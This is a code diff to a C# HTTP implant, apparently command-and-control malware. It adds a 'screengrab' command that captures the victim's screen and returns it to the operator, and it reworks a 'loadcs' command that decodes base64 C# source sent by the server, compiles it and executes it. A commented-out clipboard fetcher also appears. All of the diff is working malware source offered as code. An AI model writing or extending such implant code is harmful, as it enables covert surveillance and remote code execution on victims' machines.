@@ -7,6 +7,7 @@ using System.Timers;
 using HTTPImplant.Modules;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
+using System.Linq;
 
 namespace HTTPImplant
 {
@@ -48,6 +49,8 @@ namespace HTTPImplant
         public static void Main(string[] args)
         {
             /*ClipboardFetcher.GetData();
+            Environment.Exit(0);*/
+            /*ScreenGrab.CaptureScreen();
             Environment.Exit(0);*/
             DoAsync().GetAwaiter().GetResult();
         }
@@ -147,20 +150,25 @@ namespace HTTPImplant
                                     string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                                     await SendResult(webClient, implantId, command.Operator, outputBase64);
                                 }
-                                else if (command.Input.Trim().ToLower().Equals("loadcs"))
+                                else if (command.Input.Trim().Equals("screengrab", StringComparison.OrdinalIgnoreCase))
                                 {
+                                    Console.WriteLine("Running screen fetcher... ");
+                                    string output = ScreenGrab.CaptureScreen();
+                                    await SendResult(webClient, implantId, command.Operator, output);
+                                }
+                                else if (command.Input.Trim().Equals("loadcs", StringComparison.OrdinalIgnoreCase))
+                                {
+                                    Console.WriteLine("Attempting to Compile and Run .NET C# Code...");
+
                                     try
                                     {
-                                        string[] parts = command.File.Split(new[] { "  " }, StringSplitOptions.None);
+                                        string[] parts = command.File.Split('|').Select(part => part.Trim()).ToArray();
+
                                         string encodedSourceCode = parts[0];
                                         string className = parts[1];
                                         string methodName = parts[2];
-
                                         byte[] data = Convert.FromBase64String(encodedSourceCode);
                                         string decodedSourceCode = Encoding.UTF8.GetString(data);
-
-                                        Console.WriteLine("\r\n\r\nExecuting: " + className + "." + methodName + " For:");
-                                        Console.WriteLine("\r\n\r\n" + decodedSourceCode + "\r\n\r\n");
 
                                         CompileAndRunNET.ExecuteCS(decodedSourceCode, className, methodName);
                                     }
